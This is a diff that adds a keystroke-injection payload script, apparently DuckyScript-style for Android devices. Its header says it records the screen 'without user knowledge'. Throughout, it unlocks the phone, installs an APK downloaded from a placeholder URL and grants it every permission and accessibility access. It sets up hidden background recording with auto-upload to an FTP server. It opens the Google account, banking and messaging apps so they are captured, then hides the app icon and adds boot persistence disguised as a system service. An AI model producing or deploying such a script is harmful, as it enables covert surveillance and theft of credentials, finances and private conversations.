@@ -1,0 +1,369 @@
+REM Android Screen Recording and Capture
+REM Author: AryanVBW
+REM Version: 1.0
+REM Captures screen recording and screenshots without user knowledge
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (universal method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: ENABLE DEVELOPER OPTIONS ----
+
+REM Open Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to About phone
+STRING about
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find Build Number
+STRING build
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap on Build Number 7 times
+REPEAT 7 {
+    ENTER
+    DELAY 300
+}
+DELAY 1500
+
+REM Enter PIN/pattern if prompted
+STRING 1234
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 2: INSTALL SCREEN CAPTURE APP ----
+
+REM Go to Chrome
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access address bar
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter URL for screen capture app
+STRING https://example.com/screen-capture.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to complete
+DELAY 10000
+
+REM Open notification shade
+SWIPE 500 100 500 1700
+DELAY 1500
+
+REM Tap on download notification
+ENTER
+DELAY 3000
+
+REM Install the app
+STRING install
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 5000
+
+REM ---- STEP 3: GRANT NECESSARY PERMISSIONS ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the screen capture app
+STRING screen
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Grant all permissions
+REPEAT 5 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 4: ENABLE ACCESSIBILITY SERVICE ----
+
+REM Go to Accessibility settings
+BACK
+DELAY 800
+BACK
+DELAY 800
+STRING accessibility
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find screen capture app
+STRING screen
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable service
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm enabling
+STRING allow
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 2000
+
+REM ---- STEP 5: CONFIGURE SCREEN RECORDING SETTINGS ----
+
+REM Launch the screen capture app
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING screen
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Configure settings for stealth recording
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Enable background recording
+STRING background
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Set recording quality
+STRING quality
+DELAY 800
+ENTER
+DELAY 1000
+STRING high
+DELAY 800
+ENTER
+DELAY 1000
+
+REM Set auto-upload
+STRING upload
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Enter upload destination
+STRING ftp://example.com
+DELAY 800
+ENTER
+DELAY 1000
+STRING username
+DELAY 800
+TAB
+DELAY 300
+STRING password
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 6: START BACKGROUND RECORDING ----
+
+REM Start the recording service
+STRING start
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Minimize the app
+HOME
+DELAY 800
+
+REM ---- STEP 7: CAPTURE SENSITIVE SCREENS ----
+
+REM Open Settings again
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Accounts
+STRING accounts
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Open Google account
+STRING google
+DELAY 800
+ENTER
+DELAY 1500
+
+REM View account info
+STRING account info
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Wait to capture screen
+DELAY 3000
+
+REM ---- STEP 8: CAPTURE FINANCIAL APPS ----
+
+REM Go to home screen
+HOME
+DELAY 800
+
+REM Open banking app (generic example)
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING bank
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Wait to capture login screen
+DELAY 5000
+
+REM ---- STEP 9: CAPTURE MESSAGING APPS ----
+
+REM Go to home screen
+HOME
+DELAY 800
+
+REM Open messaging app
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING messages
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Wait to capture conversations
+DELAY 5000
+
+REM ---- STEP 10: HIDE EVIDENCE ----
+
+REM Return to home screen
+HOME
+DELAY 800
+
+REM Open the screen capture app again
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING screen
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Hide app icon from launcher
+STRING hide
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+STRING confirm
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 11: SETUP PERSISTENT RECORDING ----
+
+REM Configure auto-start on boot
+STRING autostart
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Enable persistent notification (disguised as system service)
+STRING notification
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+STRING system
+DELAY 800
+ENTER
+DELAY 1000
+
+REM ---- FINISHED ----
+REM Screen recording is now active in the background
+
+REM Return to home screen
+HOME
+DELAY 800
